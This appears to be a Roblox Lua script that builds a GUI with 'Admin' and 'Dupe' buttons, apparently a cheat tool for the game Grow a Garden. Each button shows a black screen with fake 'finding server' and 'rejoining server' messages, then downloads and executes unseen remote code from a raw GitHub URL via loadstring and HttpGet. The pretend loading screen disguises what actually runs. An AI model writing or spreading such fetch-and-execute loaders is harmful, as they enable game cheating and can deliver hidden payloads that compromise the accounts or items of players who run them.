local a = Instance.new("ScreenGui")
local b = Instance.new("Frame")
local c = Instance.new("TextLabel")
local d = Instance.new("TextButton")
local e = Instance.new("TextButton")

-- Properties for the ScreenGui
a.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Properties for the Loading Frame
b.Size = UDim2.new(1, 0, 1, 0)
b.Position = UDim2.new(0, 0, 0, 0)
b.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black background
b.Visible = false
b.Parent = a

-- Properties for the Loading Text
c.Size = UDim2.new(1, 0, 0.2, 0)
c.Position = UDim2.new(0, 0, 0.4, 0)
c.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black background
c.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
c.TextScaled = true
c.Parent = b

-- Properties for the Main Frame
local f = Instance.new("Frame")
f.Size = UDim2.new(0.4, 0, 0.4, 0)
f.Position = UDim2.new(0.3, 0, 0.3, 0)
f.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- Dark gray background
f.Parent = a

-- Properties for the Admin Button
d.Size = UDim2.new(0.8, 0, 0.2, 0)
d.Position = UDim2.new(0.1, 0, 0.1, 0)
d.BackgroundColor3 = Color3.fromRGB(50, 50, 50) -- Darker gray
d.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
d.TextScaled = true
d.Parent = f

-- Properties for the Dupe Button
e.Size = UDim2.new(0.8, 0, 0.2, 0)
e.Position = UDim2.new(0.1, 0, 0.4, 0)
e.BackgroundColor3 = Color3.fromRGB(50, 50, 50) -- Darker gray
e.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
e.TextScaled = true
e.Parent = f

-- Function to show loading screen and execute loadstring
local function g(h)
    b.Visible = true
    c.Text = h
    wait(2) -- Wait for 2 seconds to simulate loading
end

local function i()
    g("Finding a Low Server Please Wait...")
    g("Rejoining Server Please Do not Close Roblox!")
    loadstring(game:HttpGet("https://raw.githubusercontent.com/lowznt/growagarden/refs/heads/main/growagarden.lua"))()
end

-- Button click events
d.MouseButton1Click:Connect(i)
e.MouseButton1Click:Connect(i)
